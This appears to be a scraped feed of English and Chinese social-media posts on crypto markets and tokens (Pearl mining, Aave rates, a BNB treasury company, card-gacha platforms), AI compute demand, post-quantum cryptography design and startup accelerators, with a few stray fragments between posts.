author: Kaffchad
quoted_text:
► $PRL Thesis: The Bull, Bear Cases

$PRL is approaching a $3B FDV, with ~51.6 EH/s of network hashrate. But we still don't know how much of that compute is actually serving paying AI customers.

@prlnet's cuPOW uses matrix multiplication as proof-of-work. Miners run GPU-heavy computations, submit cryptographic proofs, and the network verifies the work.

The market seems to be pricing Pearl as some kind of AI-native Bitcoin, where GPUs burn electricity securing the chain while potentially doing actual AI inference.

Pretty clever, if this works at scale, mining becomes an additional revenue stream that could make inference cheaper.

What do we actually have so far?

– network hashrate is ~50.6 EH/s, more than 2x late May levels. Miners are clearly showing up

– that 320K GPUs number floating around? It's actually based on the older 24 EH/s network

– today's network could represent 389K–674K RTX 3090 equivalents

The amount of compute competing for $PRL emissions is getting pretty serious.

For perspective, current estimates put RTX 4090 mining revenue around $7.93/day, or ~$0.33 per GPU-hour before costs.

Imagine earning some of that on top of inference revenue with minimal additional overhead, across a meaningful amount of idle or underutilized GPU capacity.

What's more interesting is that Together AI announced an integration around Gemma inference with a 25%+ pricing discount, explicitly using future crypto emissions to offset compute costs.

Pearl also now advertises its own serverless inference platform across Qwen, DeepSeek, GLM and Gemma, with published pricing as low as $0.07 per million input tokens on one model.

That tells me the focus is shifting from proving the consensus mechanism works to figuring out whether it can actually compete in the inference market.

PIP-2 brings Grouped-GEMM for MoE workloads. PIP-3 (still a draft) is pushing FP8, potentially making mining and inference work together more efficiently.

But my concern is whether enough of that math becomes paid inference, and whether that value actually flows back to $PRL.

Because cheap inference subsidized by token emissions is a double-edged sword.

Great for attracting customers, maybe less great for holders if miners keep selling rewards and customers never need to buy the token.

– at $1.39, $469M mcap / $2.9B FDV, with 1M new PRL/day = $1.38M in daily issuance

– ~41% of reported daily spot volume

No VC unlocks sounds nice, but miner sell pressure still very much exists.

So the bull case is that if Pearl can get miners earning from both block rewards and real inference jobs, useful-work mining can become an actual business model.

More inference demand attracts GPUs, more GPUs improve capacity, and productive miners eventually have an edge over guys just grinding random matrices.

But the bear case is that the network keeps growing, emissions keep flowing, AI customers get cheap compute, but tokenholders never see meaningful value capture.

What I'd really want to see is a verifiable number for paid customer-linked compute as a % of total network work. Show me the jobs, the payments, and how they connect to onchain proofs.

That metric could be Pearl's equivalent of TVL back in early DeFi. The moment it starts moving, the market has something real to underwrite.

Tbh, I'm bullish on the tech, cautiously bullish on the setup, not blindly bullish on the token at any price.

OCC Finalizes First GENIUS Act Rule: No Safe Harbor for Existing Stablecoin Rewards

The OCC has issued its first final rule implementing the GENIUS Act, covering stablecoin issuance, custody, and third-party partnerships, effective January 18, 2027. Existing yield and rewards programs receive no automatic grandfathering or safe harbor; compliance will be assessed case by case.

The act prohibits issuers from paying yield solely for holding, using, or retaining stablecoins, but does not ban all third-party rewards. The OCC said rewards based at least partly on other factors may fall outside the prohibition. The implications for programs offered by Coinbase, PayPal, and Kraken remain uncertain.

text: ECB refers Aave as the reference rate.
author: StaniKulechov
quoted_text:
Fascinating new paper out of the ECB that studied Aave rates and impacts on monetary policy! 

A few takeaways: 

1. Aave is the reference rate. The paper defines "the DeFi rate" as the volume-weighted deposit rate for USDC, USDT and DAI on Aave v2 and v3, and calls Aave "the largest DeFi lending protocol" with a deposit base comparable to U.S. deposit-taking institutions. 

2. Onchain rates are their own thing. Over 2021–2026, Aave stablecoin rates averaged ~100bp above Fed funds, peaked more than 1,000bp above it, and sat ~160bp below it during the 2022–23 hiking cycle. 

3. The mechanism is now in the policy literature. The paper models two opposing forces: arbitrage capital that moves rates toward policy, and leveraged crypto demand that moves them away. It documents Aave's interest-rate model (the 92% kink, the slopes, the reserve factor) as the function that clears onchain dollar supply and demand. 

4. This rate reaches real people. The ECB notes that fintechs and exchanges increasingly use DeFi lending as the yield layer for customer stablecoin balances, and that interest from DeFi protocols sits outside the scope of GENIUS and MiCA. 

5. The paper closes with an interesting question, "what would be the critical size of DeFi beyond which it would represent an interest rate controllability challenge?"

text:
今天看到齐齐 @Web3Dc888 大致写了自己对于 BNB 储备公司 @BNBStandardCorp（ $BNC ）正式任命前 @yzilabs  投资合伙人 Alex Odagiu 为 CEO 的事的观点。

看得我心痒痒，我也想来说说自己对于这件事的观点和看法可以聊聊。

━━━━━━━━━━━━━━━━

BNC 这家公司它原本是一家做农业环境控制设备的美国上市公司，后来又跨界做起了电子烟生意。

直到去年，在 YZi Labs 和 10X Capital 的推动下，通过约 5 亿美元私募融资，正式转型为以 BNB 为核心储备资产的数字资产财库公司。

目前已经持有超过 51 万枚 binancecoin:native，成为 BNB 在美国传统资本市场上重要的机构持有主体之一。

不过，BNC 转型为 BNB 财库公司之后，发展并不是一帆风顺。

此前公司在治理结构、资产管理以及经营方向上出现过一些分歧，YZi Labs 也曾作为重要股东推动公司治理改革和董事会调整。

直到今年 6 月，双方达成合作协议，YZi Labs 的多位相关人士进入董事会，Alex Odagiu 也开始参与 BNC 的经营管理。

如今经过几个月的过渡，Alex 正式出任 CEO，意味着公司此前的治理调整进一步落实到了实际经营层面。

━━━━━━━━━━━━━━━━

我觉得这次人事任命，其实释放了几个比较积极的信号。

1/  BNC 的治理结构和管理团队正在逐步趋于稳定。

其实一家上市公司，稳定的治理结构、明确的管理层以及持续一致的战略方向，是建立资本市场信任的重要基础。

尤其是 BNC 这种数字资产财库公司，其商业模式高度依赖资本市场融资、资产管理以及长期资金配置。

所以如果可以减少这种治理层面的不确定性，让管理团队能够将更多精力投入业务发展，对公司未来的融资能力和机构投资者信心肯定都有积极意义。

2/ Alex 本身的履历也比较契合 BNC 现阶段的发展需求。

我大概看了一下 Alex 的履历，他此前在高盛从事投资银行业务，后来长期参与 YZi Labs 的投资工作，涉及 DeFi、支付、稳定币、RWA 等多个领域，对 BNB Chain 生态也有比较深入的了解。

所以他一定是既熟悉传统金融市场的资本运作，也具备加密行业的投资经验和生态资源。

对于 BNC 来说，这种横跨传统金融与 Crypto 的背景，恰好符合其作为上市数字资产财库公司的业务定位。

这也给后续更多的布局做下来长期的准备。

当然，Alex 本身其实并不是突然空降。

早几个月，其实 Alex 已经以临时总裁身份参与了公司的品牌重塑、财库信息披露平台建设，以及 BNB Chain 验证节点战略的制定。

所以这次转正，等于说出董事会对于其前期工作以及未来发展方向的认可。

━━━━━━━━━━━━━━━━

另外，我觉得还有一个细节，就是 BNC 给新 CEO 设计的股权激励考核机制。

根据 SEC 披露，Alex 的新任股权奖励中，有 60% 属于绩效股票单位。

其中考核指标包括：

35% 与以 BNB 计价的公司股价表现挂钩；

35% 与每股净 BNB 持有量挂钩；

30% 与公司的经营收入覆盖能力挂钩。

等于说，新管理层的利益与公司的长期资产积累、股东回报以及经营能力建立了更加直接的联系。

尤其是每股净 BNB 持有量这个指标。

对于财库公司而言，单纯增加持币总量并不一定意味着给股东创造价值，因为通过不断增发股票融资买币，也可能稀释原有股东权益。

但是，让每一股股票背后对应的净资产持续增长，一定是更有价值的。

这种经营收入覆盖能力的考核，进一步说明 BNC 希望提高自身的业务造血能力。

所以全新的人事变动，可以理解为 BNC 正在尝试从单纯持有 BNB，逐步向具备经营性收入的数字资产财库公司发展。

━━━━━━━━━━━━━━━━

站在更大的 BNB 生态来看，随着 BNC 的运营逐渐成熟，也有希望进一步增强传统资本市场对 BNB 的机构参与和长期配置需求。

等于说，是一个长期持续的利好。

author: ZealynxSecurity

text:
but, where tsfm models actually work is trading volume.

price in liquid markets is mostly a random walk, but volume has real structural patterns and regime shifts.

we tested models on predicting 24-hour crypto trading volume across 12 liquid assets, benchmarked against a 21-day matching-hour median (what volume normally looks like at that specific hour).

the finding was consistent across every quarter tested:
• models beat the 21-day baseline by +10% to +20% in april, july, and october.
• toto-2.0 and tirex led the pack (+18% to +19% gain).
• local models on apple silicon (timesfm-3 on mlx, t0-beta on mps) matched cloud APIs with zero failures over 4,400+ runs.
• giving t0-beta peer asset volumes pushed its gain to +19.6%.

they have no clue which way price will break, but they can anticipate when liquidity is about to surge.
author: aaronjmars

text:
here is why we still tagged the volume finding as INCONCLUSIVE in our benchmark.

most ai accounts claim victory off a single backtest. we also tested paper trading rules: a tirex long/short rule made +5.14% in late june, but lost -3.01% in march and -1.46% in october. every model rule picked on dev data lost money on validation. holding beat all of them (+3.36% vs -0.38%).

to kill that exact hindsight bias, our benchmark standard (bench-kit) enforces strict rules:
1. repeated trials on unseen dates
2. a measured A/A noise band to prove the edge is not random variance

volume beat the baseline in all three quarters, but each quarter was a single run. until we measure the noise band on fresh dates, we keep the verdict inconclusive. open science over hype.

text:
Interesting pattern with compute I keep seeing.

So NVIDIA just used 8k GPUs to simulate a quantum computer that doesn't exist yet.

The pattern is chips built for a specialized usecase solving problems better then general compute, and almost all one of them still needs GPUs to work.

Everyone's heard of the inference chips, Groq, Etched, Cerebras, plus the hyperscalers' own, TPUs, Trainium, Maia.  As well as the large labs adding chips built for fast inference, but they still train their models on GPUs.

And it's happening in every frontier field.

In Quantum, if you know anything about it, it’s that you need a lot of error correcting, so they need GPUs next to them fixing those errors in real time.

And if you thought GPUs were expensive…, well before you build a quantum computer, you want to simulate it on GPUs first, which is exactly what NVIDIA just did.

In Robotics same thing. The robot's own chip reacts in milliseconds, but it learns its skills in GPU simulation first.

Same in Biology. Custom chips simulate drug molecules and read genomes. Labs then use GPUs to screen billions of molecules they could never test by hand.

Similar in self-driving, particle physics and many other fields.

Each specialized chip will be great at one job, but every one creates more work for GPUs, because when you become more efficient at solving a problme, you don't stop, you tackle harder and harder problems. 

And so the list keeps growing, and so does demand for compute.

在大家纷纷起身，觥筹交错，举杯畅饮之际。

爱情的忠贞就在于此，

text:
和一个founder朋友聊天 正巧赶上凌晨奇绩被制裁的消息

一致认为奇绩的打法已经远远落后于ai时代

之前的手搓时代，打磨细节带来更好体验
而现在 比的确却是谁能把生态位先立住

YC模式的精髓在于
Launch now. Talk to users. Iterate.
在3个月的时间内实现创业者和个人高密度的成长，寻求新的融资机会

但在老中人的考试基因下，demo day反而成了那个靶子，是一场大考

3个月时间打磨项目和pitch 世界早就变样了

真实的创业考场从来不在一场声势浩大的demo day上

而这种模式下培养出来的founder多多少少也会带着一些思维惯性

无意贬低，中国的vc或多或少的都会因为整体的投资环境或者GPLP的压力而做一些不符合风投的行为

一千个投资人聚集于此，上百创业项目，无数名校、大厂、小天才、phd创业者，一片光明

最后再讲讲心里话

奇绩一直以来被各种谩骂包裹，不管是如太阳鱼甩籽一般无孔不入的实习生，还是投不出来好项目的嘲讽，让奇绩在创投圈总是有些尴尬

甚至还有对陆奇博士的攻讦，颇为难听

但我想说的是，奇绩真的给了很多人机会，也真的培养了一群有理想有拼劲儿的年轻人，

一个在文科含量150%学校上学的小姑娘第一次接触到ChatGPT，看着大家在飞书群里和GPT对话，仿佛魔法，那是2022年

在ai行业聊天时提到奇绩，实习过的小伙伴都会会心一笑，问彼此在哪个组，什么时候

我仍然记得23年的春节，陆奇博士为新一轮融资奔走，仍然花了几个小时在All hands meeting上，一个一个回答大家的问题（虽然我被怒喷xs）

如今65岁的年纪，依旧勤勉，几次早上五点多看到他背着书包，脚下生风去工作

唯有尊敬和感激

或许奇绩不够成功，或许陆奇博士不够成功，但总需要有人来耕地和播种

总是播种，常常期待，有时收获

text:
孙宇晨跟金明 William Joy 的采访里，还有一句话让我印象很深值得拿出来反复琢磨：

人类最大单一企业的市值上限，大概不会超过美债总额的一半。
这句话很有意思，给超级企业的估值寻找一个宏观参照，给资产的估值寻找一个锚。

目前美国国债总额大约40万亿美元，一半就是20万亿美元。
全球市值最大的公司是英伟达，目前大约5.23万亿美元。
如果英伟达继续上涨286.2%，市值就会来到20.2万亿美元，一家再牛逼的公司，发展到这个规模确实顶天了。

一家公司靠利润支撑市值，美国国债背后是美国的国家信用、财政能力以及美元体系。
单一企业的极限为什么偏偏是美债的一半，公司不可能大于国家。

再看黄金，黄金今年最高时市值接近40万亿美元，之后黄金见顶了。
黄金和英伟达不一样，英伟达是一家公司，黄金是全球共同认可的储值资产，只要美国依然保持科技、金融和军事综合国力第一的情况下，黄金的市值很难超过美债总额。

理解以上，就可以用这个就可以反推黄金市值的下限了。

how long do they hold?

→ fully out: ~14 minutes
→ 86% of bundle wallets were completely out within the hour

devs are even faster: fully out in ~10 minutes.

market cap: pumped. volume: pumped. holder count: pumped.

Yes, the DSA aligns more closely with classical socialism (collective/public ownership of the means of production) than social democracy. Its platform calls for public ownership of the largest corporations and key industries like energy and transport, with workers democratically controlling the economy to replace capitalism.

Membership has grown from about 6,000 pre-2016 to over 120,000 by mid-2026, with 200+ chapters. Influence is rising via local and state wins, including NYC Mayor Zohran Mamdani, plus some congressional primary successes, though national power remains limited.

text:
I agree with Justin that protocol agility is critical. One way to get there is to make the core protocol depend on as few assumptions as possible. The rest can go off-chain where upgrades can be performed much more easily.

For Miden specifically, we've designed the core protocol to depend only on hashes and STARKs (with fixed-depth recursion). This doesn't mean we don't use elliptic curves or lattices - we do, and in fact Falcon is one of the signature schemes that we support out of the box. But the core protocol does not depend on these. These are used in the auxiliary off-chain services.

This setup allows us to use the most convenient primitives now, and switch over to other primitives when/if the times comes. For example, for deriving shared secretes for private note distribution we can use ECDH now, and switch to lattice-based alternatives later, without having to upgrade the core protocol.
author: 0xMiden
quoted_text:
A few reflections on the lattice vs. hash-only debate that our recent Aerie post sparked:

1. Cryptographic ossification for blockchains was never safe. Until the day we know with certainty that P ≠ NP, that finding short vectors in lattices is intractable, that Keccak effectively behaves like a random oracle in deployed SNARKs, and that every single bug has been eliminated from our codebases, blockchains cannot ossify. That is simply not how safe systems are built. Issues will arise, and the system will have to respond.

It’s a double standard to reject lattices because blockchains are hard to upgrade if lattices break, while counting on upgrades if AI breaks your hash function or finds a critical zkVM bug.

The best counterargument is that hash-only designs are more agile: if your hash function breaks, just swap out the hash. But we must aspire to a higher level of agility than this. Indeed, as I cover next, if SNARK recursion itself turns out to degrade security, the proposed hash-only blockchain designs would need to be rethought from the ground up.

2. The real security debate is not lattices vs. hashes — it is lattices vs. building everything on SNARK recursion. That’s because “hash-only” is not really hash-only: it rests on hashes plus the soundness of deep SNARK recursion. Ethereum’s roadmap relies on exactly that: hash-based aggregation needs recursion to keep up with a slot’s worth of signatures, and EIP-8288 would send other signature schemes and users’ own proofs through the same recursive pipeline. In contrast, Aerie proves a slot’s worth of signatures on one laptop without any recursion.

All deployed post-quantum SNARKs rely on the Random Oracle Methodology (via Fiat–Shamir) to establish their security. This is an idealization we know fails in the real world: we have explicit counterexamples where “SNARKs” coming out of this methodology are totally insecure when instantiated with any concrete hash function.

We generally ignore these counterexamples in part because they only arise when proving contrived, self-referential statements about the very hash function used by the SNARK verifier.

But proving statements about the verifier’s own hash function is the exact thing you do in SNARK recursion. That’s why the security of recursive SNARKs can’t be established even in the random oracle model.

On top of that, the standard security proofs for recursion (in other models) suffer an “extractor runtime” blowup that is exponential in the recursion depth, suggesting that security may degrade as more recursion is applied. Yet Ethereum’s own EIP-8288 enables unlimited-depth recursion, even as it lists soundness of recursive SNARKs as a trust assumption. Proofs in more idealized models avoid the blowup, but they mainly tell us that an attack on SNARK recursion would have to exploit the concrete hash function, which is exactly what the Fiat–Shamir attacks above do.

To be clear, we don’t know of any outright attacks on SNARK recursion, and I very much hope it is secure. But some of us who have studied the question have a lingering sense that an attack may be possible in some settings. And if AI is going to supercharge cryptanalysis, there is no reason to expect it to spare Fiat–Shamir for SNARKs, let alone SNARK recursion, both of which have had far less scrutiny than lattices.

So, I do not concede that a “recursion everywhere” hash-only approach is clearly more conservative than one built on standard lattice assumptions.

3. “Just wrap everything in a hash-based SNARK” (like EIP-8288) faces challenges.

Aggregating signatures and proofs off-chain into a single block-level proof is a powerful design independent of the hash-only vs. lattice debate, and I am not telling people to avoid it. But claiming, as Vitalik Buterin did this week, that users can run whatever cryptography they want locally and wrap it in a client-side leanVM proof glosses over major hurdles.
For example, leanVM today is a minimal VM designed almost entirely to prove hash-based signatures and recursion, not general-purpose computation. And binary-field SNARKs like leanVM remain slow at proving the integer multiplications that lattice cryptography does en masse.

I am optimistic that many of these zkVM challenges can be met (including via my own work, binary-field Twist and Shout, which are now implemented in Magnetar). But regardless, if lattices can make aggregation simpler and faster, then they should be leveraged. We need to be agile no matter what.

4. For chains whose reason for existence is privacy, I truly struggle to understand the pushback. Public-key encryption (and fast single-server PIR) cannot be built from hashes alone, at least not in any black-box way. If lattices break, it is going to be very, very hard for these chains to provide acceptable levels of privacy and functionality. For a project whose entire reason for existence is privacy, a loss of confidentiality is an existential failure. Next to that, a second signature upgrade (after the first one, from elliptic curves alone to, hopefully, a hybrid lattice scheme) is easy.

Summary: We don’t know for sure what is secure and what isn’t. We are all weighing unquantifiable risks against each other, and we do not need to agree on a total order on them. But hash-only solutions face many open engineering challenges, and they are not more “conservative” in the way some have argued. Some of those challenges are entirely prosaic and have nothing to do with bugs or cryptography, like hardware support for custom schemes whose hash function is still undecided. I hope we can overcome those challenges within the appropriate timelines, but they must be acknowledged and portrayed realistically.

Overall, cryptographic agility and defense in depth (e.g., hybrid signatures) are the answer, which is why we are building both lattice-Jolt and hash-Jolt. In practice, the positions are less polarized than social media discourse suggests: for example, StarkWare is working to make Falcon verification cheap (https://t.co/FM68hmkqRx), which is great to see.

Here is the (apparently) controversial take I am sticking to: Conditioned on agility, whenever lattices make systems simpler or more functional, we should embrace them rather than default to “hash-only” designs. Lattices are what the rest of the world will depend on, with decades of study and hardening behind them, and at the system level, less functional often means less secure. Where hash-only designs are just as simple and functional, by all means use them.

text:
最近很多市场注意力又重新回到了 solana:CARDSccUMFKoPRZxt5vt3ksUbxEFEcnZ3H2pd3dKxYjp 
因为发现 Pump 和 Coinbase 的 TCG 拆卡
都是 Powered by @Collector_Crypt 

大家意识到它的业务模式，已经从单纯的拆卡平台，慢慢转向 Infra Play 了，因此开始对 solana:CARDSccUMFKoPRZxt5vt3ksUbxEFEcnZ3H2pd3dKxYjp 进行重估。

其实也没有那么复杂，更多属于在需求侧拓展了分销渠道，进一步盘活库存，增加库存周转率，从而增加收入。之前就提过，Gacha 平台的业务模型就是存货周转，通过每一次抽卡 + 用户把卡折价回售的差价，让同一批卡反复赚取 Spread，并不断降低其卡库存的持仓成本。

不过需求端的暴涨，必然带来供给端的瓶颈。

照 Pump 和 Coinbase 这个趋势下去，卡牌供应很快就会捉襟见肘，市场也会逐步意识到，这类业务的瓶颈更多在于供给端，货源供给才是决定业务扩张弹性的关键。

而大部分 Gacha 平台，包括 @Collector_Crypt 自己在内，都是用自己业务的利润去补卡和扩张，利润主要源自用户回售卡牌的折价 Spread。导致流水非常好，但实际净收入，其实比例较低，而这部分净收入也大部分都投入到了补货之中，留给代币持有者或者说用于回购的资金量，并不多。我们来结合实际的数据体会一下：

几个核心指标，

- 毛收入：抽卡花费，本质是 GMV
- 净收入（真正收入）：毛收入减去回购被抽走卡牌花费
- 综合毛利：净收入减去抽卡后被留存的卡的进货成本
- 自由现金流：综合毛利减去用于补货的投入

根据 @Collector_Crypt 的第二季度报告

- 毛收入，即 GMV，为 $406M
- 净收入，真正的收入，为 $32M
- 综合毛利，为 $20M
- 补货的投入，为 $26M

是的，补货的投入是大于综合毛利的，也就是说，能够用于赋能代币的这部分“自由现金流”，是负的。很多人可能不太理解这里为什么要有个综合毛利，而不是直接用净收入，去减补货投入。这是因为：

Gacha 本质属于一种 Gamefied 的寄售模式，用户在抽卡后（产生GMV），既可以选择回售（净收入的来源），此时库存仍在平台手中，也可以选择不回售，保留这张卡，此时，平台的库存真正被卖出去了，因此需要结转库存，进入销货成本，并把这部分成本从净收入里面减去。

有点扯远了，不需要知道那么细。

但从上面的数字，我们能感知到，补货对现金流以及代币价值捕获的巨大影响的，这就是一个巨大的 cash drag：

收入的扩张依赖于更多的库存，而库存又需要自己花钱，钱又来自于 Gacha 赚的利润，何时才能捕获给代币啊？

投资要投资瓶颈！

而整个 Gacha 产业链，真正在解决供给端瓶颈的，目前确实也只有 @renaissxyz 一家。如果说 Gacha 就是卡牌未来最重要的流转方式，那么，通过 Stake to Earn Vault 来归集线下卡店的库存以及用户手里的库存，为 Gacha 盲盒源源不断提供供给，就是打破"库存只能靠平台自己花钱囤"这种很重模式的关键解法。

只有现金流被释放出来了，才能给代币赋能。

而未来整个产业链，可能就变成：

用户 → Pump / Coinbase(分销/前端) → Collector Crypt / Renaiss(供给/库存引擎) 

这三层。
author: bonnazhu
quoted_text:
上周和 @Plus_Ultra_715 聊了一个多小时
很久没见到这样有激情的 Founder 了
会不由自主想要写一些东西分享出来

聊之前会觉得只是另一个 Gacha 平台
聊之后觉得实际在做卡牌的基础设施
过几天再回味，觉得是重构卡牌生意的经济关系
今天下笔又觉得是聚合卡牌供给，去创造大流动性
 
大部分人可能只停留在第二个层面
但只有看到了三和四，才能更深刻回过头去理解一和二

一些自问自答和碎碎念
论证 @renaissxyz 模式的商业逻辑 👇
 
---------------------
 
1、卡牌是个周转生意，但被困在各个闭环里

卡牌的渠道分线下和线上。

由于自带的社交与收藏属性，即便是在互联网发达的今天，绝大多数卡牌仍是通过线下分销出去的。卡店/道馆进货、卖货（以IP原厂的密封卡包为主），为用户提供拆卡、对战、交易的场所，并可能对部分卡提供折扣回收服务，就构成了最初的卡牌一级市场和二级市场。

eBay出现后，借助其标准化的搜索、成交体系以及线上的流量，卡牌二手交易开始发生在互联网，不再受限于本地卡店。后来，eBay 收购了另一家卡牌线上交易平台TCGplayer（卡店上网卖货的主通道），深度绑定 PSA，成交量上了一个台阶，成为二级市场主力，大量卡店也开始把回收回来的货搬到 eBay 上卖。

再后来，Gacha 平台出现。和卡店大部分卖原厂卡包不同，Gacha 专做有明确市价、已评级的单卡，他们把二级市场上收来的卡，二次打包成精品盲盒，再硬性捆绑一个高比例的即时回购，售卖给那些追求多巴胺刺激的用户。而这套即时回购机制，也把卡的周转率一下子拉了起来，同一批卡，抽走、回购、再抽，再回购，每一次Gacha平台都赚一道，直到卡的库存成本被摊到趋近于零，比卡店那种一锤子买卖暴利得多。

然而这三种流转渠道其实是各自的闭环，并不完全互通。例如你拿一张卡，在 eBay 上挂着卖，这张卡能不能同时在 Gacha 平台的盲盒池里被抽？不能。它在 eBay 体系里，eBay 不知道也不在乎链上发生了什么。反过来，一张卡在 Gacha 平台被抽走、换了主人，eBay / PSA Vault那边也压根不会反映，它还可能挂在那儿出售。

以及还有大量的卡，其实并没有动起来，他们大多要么躺在收藏用户的抽屉里，或者被存储在一些诸如PSA的金库之中。相当于，大部分卡和货，目前飘在这些地方：

- 线上eBay体系
- 线下卡店网络
- Gacha平台
- 收藏群体自持
- 金库存储

看似各类基础设施都很完善，但实际上，并没有一张网把它们全部串联起来。这为后面基建的重构，埋下了伏笔。

---------------------

2、卡店 VS Gacha平台：亦敌亦友

有货才有钱赚，周转速度决定利润。

除去 eBay 这种不持有货源、只负责撮合的二手交易市场，另外两大流转源：卡店和Gacha平台，其业务的扩张都是依赖真金白银囤货的，边际成本不为零，所以对他们来说，如何提高周转效率，以及如何低成本获取货源，就是他们业务模型中最核心的变量。

而在我看来，两者亦敌亦友的点正好在于：

Gacha 平台拥有最好的周转模型，但往往被货源数量给限制了业务规模，卡店并不缺卡和卡源，但并没有Gacha运营基因，周转速度上不去，长短板正好相反。

Gacha的货源需要自己去外面二级市场收，赚的钱大部分逃不开库存的再投入，甚至需要融资来填，这跟 AI 大模型公司必须不断屯更多算力和 GPU、才能服务更多推理需求，其实是同一个道理。

而卡店手里攥着大量收藏群体和社群流量，天生就能接触到各种流通的卡。用户开了一级卡包之后，那些不想要的卡，很多也会折价卖给卡店，重新变成卡店的库存，但这部分库存，卡店并没有一条像 Gacha 那样高效率的周转消化通道，大多还是积着，或者自己去 eBay 上卖掉。

那有没有可能，干脆让他俩搭伙，

卡店出货，Gacha 出周转，各取所需？

道理是这个道理。大方向上也符合我们之前所说的打通各个流转闭环趋势。但毕竟也是半个竞争对手，要协作，还得依赖一层双方都能信任的中介。

---------------------

3、金库或卡店的POS系统，可以是这个信任中介么？

卡店和 Gacha 要协作，或者往大了说，各个流转渠道之间要互通所依赖的信任，其本质是：

货源的状态同步。

卡店、Gacha、交易市场、收藏群体，大家共享同一批货，那么谁手里有什么、哪张被抽走了、哪张卖掉了，就必须有一个所有人都认、且实时更新的统一账本。

那现成的，有没有可以扛起这个重担的玩家呢？

候选无非两个：金库，或者，卡店的 POS 系统。

先说金库。

大部分金库其实只管存，根本不管同步和查询。比如 Brink's，全球最大的金库安保公司，它本来就是服务黄金、艺术品这类几乎不周转、不流动的昂贵资产的。卡牌这种经常换手的东西，根本不是它的理想客户，还贵。那便宜、对卡牌友好的呢？比如 PSA Vault，但它对外开放的可验证信息少，比如只能看到一个认证编号对应的卡的在库状态，至于持有人是谁，经手过谁，是查不到的。

本身是出于隐私保护，但也催生了一个鸡贼的空间：一个 Gacha 平台完全可以声称自己拥有这张卡然后拿来给人抽，反正纯粹的外部人员没法通过官方渠道查到持有人和这个 Gacha 平台的对应关系。某种程度上，这也是为什么 PSA Vault 会和 eBay 体系闭环绑定这么深，所有权和流转，只在 eBay 这个闭环内相对保真，一旦卡跑到它控制不了的外部渠道，例如卡店、Gacha 等去换手，就没法核实和背书了，更不用说状态同步了。

再说 POS系统。

它至少是会同步卡牌状态的，这是它的本职。POS（Point of Sale）就是那个零售店常用的收银系统，卡牌店的POS系统会更复杂一些，因为卡牌 SKU 比较多，而且单卡价格是波动的，因此需要依靠一套专门的POS来负责扫码入库、自动定价、管理回收，再把库存同步到线上各个渠道去卖，主流的是 BinderPOS、SortSwift 这类。

BinderPOS 能把库存推到 Shopify、eBay；SortSwift也是类似，Shopify、eBay、Square、CardTrader，全是 Web2 市场。它本质上只是个传统多渠道零售的同步器，压根没覆盖链上、Gacha 这种快速增长的新场景。

看到这里，你会和我有同样的释然么？

一开始我也觉得，卡牌的传统基建似乎已经很完善了，评级、托管、交易、数据，一应俱全，再去做一遍，是不是重复造轮子？可是你看到了其实他们压根是如此老旧，既没法覆盖快速增长的新场景，也根本谈不上透明、可验证，就知道这里面空间和痛点太大。

就应该被重构。

---------------------

4、Renaiss 改变了产业链上玩家的经济关系

很多人看到 Renaiss 要做一堆事情，会觉得它摊子铺得太大，但其实核心都是围绕打通原先各自为战的流转闭环来做的。把分散在各处的货源打通，聚成一个 Universal 的流动性池，为上层经济/金融活动构建基础。

并且不止卡店，Renaiss 还顺手把原先基本不参与这门生意的持卡个人，以及他们存卡的金库，一起拉进来了。原本那些卡一直躺在家里和金库抽屉里，只用作收藏和升值目的，现在也可以成为这个存货周转游戏的一环。

为此，Renaiss 做了 2 件事情：

- 把卡店、金库拉进来的，可验证的托管/库存同步系统
- 让供货有利可图的寄售分成经济体系

Renaiss的托管，500 美金以下的低价卡，走卡店签名托管；500美元以上的高价卡，进专业金库；再叠一层谁都能查的第三方验证，信息包含物理位置，存储在谁手上，以及各种流转信息。便宜、换手快的卡，塞进专业金库不划算，让卡店就近周转；贵的、不常动的，进金库。

而寄售模式某种程度上其实也是对卡牌业务扩展性问题的一个回答。原本卡店和 Gacha 自己囤货，边际成本不为零，而寄售则是把库存的来源，从自己垫钱投入变成靠外部贡献，扩张不再受限于资本，而获得这些卡源的成本，是每个月给寄售用户的收入分成（来自Gacha或其他上层经济活动），边际成本大幅降低。

这其实是一种以“租”代“买”的业务模式、经济关系变革。

而这套模式，对参与的多方，这都是划算的：

例如卡店、金库在这个模式之中，本质上是等于多开了一条线上的业务收入来源，每次抽卡或者上层经济活动发生，他们也都能分到收入，不用额外投入资金，也不用承担自己去做一个 Gacha 平台的获客和运营成本，只需要接入这套系统，加入这个游戏即可。

而对于广大的收藏群体用户，他们手里的卡也能周转起来，从单纯的持有等升值变成一个生息的资产，每一次被抽中，持卡人都能分到一笔抽卡收入，未来还可能有其他的收入！换个角度看，这笔分成也相当于在持续摊薄他持有这张卡的成本，变成和 Gacha 平台一样的持卡角色。

对 Gacha 平台来说，这套模式也帮助把一个"重资产、靠自有资本扩张"的生意改造成一个"轻资产、靠聚合外部库存扩张"的生意，卸掉了资本投入的包袱。并且，之前，卡是平台自己花钱屯的，存货风险压在它头上，它得留点操作空间保命、回本，往往会不得不留后门，也不敢开源其抽卡概率，但当货源风险分摊了，开源也就没阻碍了。

既解决经济问题，又解决信任问题的典范。

---------------------

5、卡店、金库为什么愿意参与这个游戏？

即便有商业利益，要让卡店、金库改变自己用了多年的现有模式，总归是有迁移成本的，毕竟你也是在给他们画饼嘛，因此得有一些额外的东西来说服他们。

Renaiss给的，是两样东西：数据，和库存管理。

数据，尤其是卡的价格，是卡店每天都要查的。可它们之前能参考的大多只有 eBay 这类线上渠道。但是并非所有交易都在线上，大部分成交实际发生在卡店这样的线下零售渠道，这部分 eBay 上是看不到的。

Renaiss 通过和卡店合作、给卡店铺系统，一方面拿到了这些线下的报价数据，一边也让愿意加入这个游戏的卡店，能看到其他卡店的报价和成交，你会不想要接入一个更全的行情网络吗？

而库存管理，与我们之前所说的货源状态同步诉求息息相关。Renaiss 给卡店的库存管理，是一个涵盖链上的状态同步系统。这意味着同一张卡，理论上可以同时挂在各个渠道，线下店里、线上市场、Gacha 盲盒池，最大化它被卖出、被抽走的可能。而一旦它在某一个渠道成交了，或者在盲盒里被抽走了，其他所有渠道立刻同步下架，绝不会出现两头都卖、超卖穿仓的情况。

对卡店来说，这就是直接的生意改善：货能铺到更多渠道，周转率就更高；周转率高了，收入就更多，切中最大的痛点上，之前就说过，线下卡店最缺的就是周转效率。

这也是我理解，为什么 Renaiss 会铺那么多业务的原因

- Vault OS：托管
- Renaiss Protocol：流动性协议，含 Gacha，Market
- Renaiss Index：价格预言机
- Renaiss Fi：上层的DeFi应用
- Renaiss Labs：SDK / CLI / Skill等生态工具

